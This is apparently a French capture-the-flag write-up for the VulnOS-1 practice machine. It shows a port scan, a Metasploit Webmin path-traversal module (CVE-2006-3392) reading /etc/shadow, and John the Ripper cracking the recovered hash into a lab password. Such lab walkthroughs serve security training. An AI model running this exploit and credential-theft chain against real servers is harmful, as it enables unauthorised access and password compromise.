# VulnOS-1
1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌──[parrot@parrot]─[~/Desktop]
└──╼ $sudo sh massap.sh
[sudo] Mot de passe de parrot : 
Entrer une IP: 192.168.56.60
Entrer un rate: 1000
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2025-01-22 19:18:52 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 20:21 CET           
NSE: Loaded 150 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:21
Completed NSE at 20:21, 10.01s elapsed
Initiating NSE at 20:21
Completed NSE at 20:21, 0.00s elapsed
Initiating ARP Ping Scan at 20:21
Scanning 192.168.56.60 [1 port]
Completed ARP Ping Scan at 20:21, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:21
Completed Parallel DNS resolution of 1 host. at 20:21, 0.00s elapsed
Initiating SYN Stealth Scan at 20:21
Scanning 192.168.56.60 [28 ports]
Discovered open port 445/tcp on 192.168.56.60
Discovered open port 995/tcp on 192.168.56.60
Discovered open port 3306/tcp on 192.168.56.60
Discovered open port 80/tcp on 192.168.56.60
Discovered open port 23/tcp on 192.168.56.60
Discovered open port 143/tcp on 192.168.56.60
Discovered open port 53/tcp on 192.168.56.60
Discovered open port 993/tcp on 192.168.56.60
Discovered open port 139/tcp on 192.168.56.60
Discovered open port 22/tcp on 192.168.56.60
Discovered open port 110/tcp on 192.168.56.60
Discovered open port 25/tcp on 192.168.56.60
Discovered open port 111/tcp on 192.168.56.60
Discovered open port 8080/tcp on 192.168.56.60
Discovered open port 6667/tcp on 192.168.56.60
Discovered open port 2049/tcp on 192.168.56.60
Discovered open port 512/tcp on 192.168.56.60
Discovered open port 10000/tcp on 192.168.56.60
Discovered open port 49875/tcp on 192.168.56.60
Discovered open port 52172/tcp on 192.168.56.60
Discovered open port 389/tcp on 192.168.56.60
Discovered open port 49330/tcp on 192.168.56.60
Discovered open port 2000/tcp on 192.168.56.60
Discovered open port 8070/tcp on 192.168.56.60
Discovered open port 514/tcp on 192.168.56.60
Discovered open port 513/tcp on 192.168.56.60
Discovered open port 3632/tcp on 192.168.56.60
Discovered open port 901/tcp on 192.168.56.60
Completed SYN Stealth Scan at 20:21, 0.05s elapsed (28 total ports)
Initiating Service scan at 20:21
Scanning 28 services on 192.168.56.60
```

&nbsp;

**<span style="color: #dddddd;">☠️</span> http-vuln-cve2006-3392**

Path traversal

```
| http-vuln-cve2006-3392: 
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.

```

&nbsp;

💥 **Metasploit - File_Disclosure**

Avec un path traversal nous pouvons lire le fichier `shadow`

```
[msf](Jobs:0 Agents:0) auxiliary(admin/webmin/file_disclosure) >> set rpath /etc/shadow
rpath => /etc/shadow
[msf](Jobs:0 Agents:0) auxiliary(admin/webmin/file_disclosure) >> run
[*] Running module against 192.168.56.60
[*] Attempting to retrieve /etc/shadow...
[*] The server returned: 200 Document follows
root:*:16137:0:99999:7:::
daemon:*:16137:0:99999:7:::
bin:*:16137:0:99999:7:::
sys:*:16137:0:99999:7:::
sync:*:16137:0:99999:7:::
games:*:16137:0:99999:7:::
man:*:16137:0:99999:7:::
lp:*:16137:0:99999:7:::
mail:*:16137:0:99999:7:::
news:*:16137:0:99999:7:::
uucp:*:16137:0:99999:7:::
proxy:*:16137:0:99999:7:::
www-data:*:16137:0:99999:7:::
backup:*:16137:0:99999:7:::
list:*:16137:0:99999:7:::
irc:*:16137:0:99999:7:::
gnats:*:16137:0:99999:7:::
nobody:*:16137:0:99999:7:::
libuuid:!:16137:0:99999:7:::
syslog:*:16137:0:99999:7:::
landscape:*:16137:0:99999:7:::
vulnosadmin:$6$SLXu95CH$pVAdp447R4MEFKtHrWcDV7WIBuiP2Yp0NJTVPyg37K9U11SFuLena8p.xbnSVJFAeg1WO28ljNAPrlXaghLmo/:16137:0:99999:7:::
sysadmin:admin:16137:0:99999:7:::
webmin:webmin:16137:0:99999:7:::
hackme:hackme:16137:0:99999:7:::
sa:password1:16137:0:99999:7:::
stupiduser:stupiduser:16137:0:99999:7:::
messagebus:*:16137:0:99999:7:::
distccd:*:16137:0:99999:7:::
sshd:*:16138:0:99999:7:::
openldap:!:16138:0:99999:7:::
ftp:!:16138:0:99999:7:::
mysql:!:16138:0:99999:7:::
telnetd:*:16138:0:99999:7:::
bind:*:16138:0:99999:7:::
postgres:*:16138:0:99999:7:::
postfix:*:16138:0:99999:7:::
dovecot:*:16138:0:99999:7:::
tomcat6:*:16138:0:99999:7:::
statd:*:16138:0:99999:7:::
snmp:*:16138:0:99999:7:::
nagios:!:16140:0:99999:7:::
openerp:*:16140:0:99999:7:::
[*] Auxiliary module execution completed
```

&nbsp;

**<span style="color: #dddddd;">🧨</span> JohnTheRipper**

Crack du hash utilisateur de `vulnosadmin`

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $john vulnos1 --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
canuhackme       (vulnosadmin)     
1g 0:00:00:00 DONE (2025-01-22 21:21) 1.470g/s 752.9p/s 752.9c/s 752.9C/s canuhackme..brandy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
┌─[parrot@parrot]─[~/Desktop]
└──╼ $john --show vulnos1
vulnosadmin:canuhackme:16137:0:99999:7:::

1 password hash cracked, 0 left
```

&nbsp;

Cred trouver

| User | Password |
| --- | --- |
| vulnosadmin | canuhackme |
